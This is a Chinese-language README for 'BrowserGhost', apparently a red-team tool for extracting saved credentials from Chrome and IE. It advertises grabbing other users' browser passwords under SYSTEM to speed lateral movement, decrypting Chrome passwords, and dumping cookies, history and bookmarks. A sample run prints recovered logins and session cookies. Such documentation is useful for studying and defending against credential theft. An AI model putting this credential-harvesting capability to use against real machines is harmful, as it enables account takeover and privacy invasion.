# BrowserGhost

## 介绍：

这是一个抓取浏览器密码的工具，后续会添加更多功能

## 当前已经完成的功能：

- 实现system抓机器上其他用户的浏览器密码(方便横向移动时快速凭据采集)
- 用.net2 实现可兼容大部分windows，并去掉依赖(不需要System.Data.SQLite.dll这些累赘)
- 可以解密chrome全版本密码(chrome80版本后加密方式变了)
- Chrome已经可以获取login data、cookie、history、book了
- IE 支持获取书签、密码、history了 (.net2提取密码太复杂了代码参考至`https://github.com/djhohnstein/SharpWeb/raw/master/Edge/SharpEdge.cs`)


## 即将去做:

- system权限下获取IE History有点问题
- 优化输出
- 监控实时cookie
- 兼容其他主流浏览器(firefox、360极速浏览器等)

```
C:\Users\Administrator\Desktop>BrowserGhost.exe
[+] Current user Administrator
[*] [4764] [explorer] [Administrator]
[*] Impersonate user Administrator
[*] Current user Administrator
===============Chrome=============

[*]Get Chrome Login Data
	[+] Copy C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data to C:\Users\Administrator\AppData\Local\Temp\tmp6B9F.tmp
	[URL] -> https://xui.ptlogin2.qq.com/cgi-bin/xlogin
	[USERNAME] -> n0thing@gmail.com
	[PASSWORD] -> Iloveprettygirls

	[+] Delete File C:\Users\Administrator\AppData\Local\Temp\tmp6B9F.tmp

[*]Get Chrome Bookmarks
{
   "checksum": "eee70b132cc4f9644d01f989e18fdb38",
   "roots": {
      "bookmark_bar": {
         "children": [ {
            "date_added": "13236861887917624",
            "guid": "c5df2041-d745-4173-af39-b5c48f8d98a2",
            "id": "5",
            "name": "GitHub",
            "type": "url",
            "url": "https://github.com/"
         } ],
         "date_added": "13236861618031351",
         "date_modified": "13236861887917624",
         "guid": "00000000-0000-4000-a000-000000000002",
         "id": "1",
         "name": "书签栏",
         "type": "folder"
      },
      "other": {
         "children": [  ],
         "date_added": "13236861618031378",
         "date_modified": "0",
         "guid": "00000000-0000-4000-a000-000000000003",
         "id": "2",
         "name": "其他书签",
         "type": "folder"
      },
      "synced": {
         "children": [  ],
         "date_added": "13236861618031381",
         "date_modified": "0",
         "guid": "00000000-0000-4000-a000-000000000004",
         "id": "3",
         "name": "移动设备书签",
         "type": "folder"
      }
   },
   "version": 1
}


[*]Get Chrome Cookie
	[+] Copy C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Cookies to C:\Users\Administrator\AppData\Local\Temp\tmp6D94.tmp
	[github.com] 	 _device_id=516175fxxxxxxxxx90133c2
	[.github.com] 	 _octo=GH1.1.3xxxxxxxxx5173
	[.google.com] 	 NID=204=DEIRBPT8FML_IsHGv1B2xxxxxxxxxxxxxxxxxxxSRlaNRV3-nfhFV8aHAgO6Smtf4JXQqR-W63p0KOVKgVd0VCXv4bKww97DEhc-PI1sVdbD4hGOuVwchN4Bwo-V61AtfjZM
	[+] Delete File C:\Users\Administrator\AppData\Local\Temp\tmp6D94.tmp

[*]Get Chrome History
	[+] Copy C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\History to C:\Users\Administrator\AppData\Local\Temp\tmp6E32.tmp
	http://github.com/ 	 The world’s leading software development platform · GitHub
	https://github.com/ 	 GitHub
	https://github.com/login 	 Sign in to GitHub · GitHub

	[+] Delete File C:\Users\Administrator\AppData\Local\Temp\tmp6E32.tmp
===============IE=============

[*]Get IE Books
	C:\Users\Administrator\Favorites\Sign in to GitHub · GitHub.url
		URL=https://github.com/session


[*]Get IE Password
	Vault Type   : Web Credentials
	Resource     : https://github.com/
	Identity     : n0thing@gmail.com
	Credential   : Iloveprettygirls
	LastModified : 2020/6/17 7:08:50


[*]Get IE History
	https://github.com/login
	https://github.com/join
	https://github.com/john
	https://github.com/sign
	http://github.com/
	http://go.microsoft.com/fwlink/p/?LinkId=255141
[*] Recvtoself
[*] Current user Administrator



```

![](2.png)
